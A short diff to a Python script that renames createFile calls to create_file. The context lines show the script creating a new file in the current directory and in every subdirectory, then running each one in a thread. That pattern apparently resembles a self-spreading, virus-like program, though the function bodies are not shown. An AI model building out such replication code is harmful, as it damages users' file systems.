@@ -50,7 +50,7 @@ def create_file():
 
 
 # Create the new file in current dir and run
-thread = Thread(target=runFuncv, args=[".\\" + createFile()])
+thread = Thread(target=runFuncv, args=[".\\" + create_file()])
 thread.start()
 
 #walk to subdirs
@@ -58,7 +58,7 @@ for x in os.walk(directory):
     if x[0] == os.getcwd():
         continue
     # Create the new file and include a different name
-    thread = Thread(target=runFuncv, args=[x[0] + "\\" + createFile()])
+    thread = Thread(target=runFuncv, args=[x[0] + "\\" + create_file()])
     thread.start()
 
 
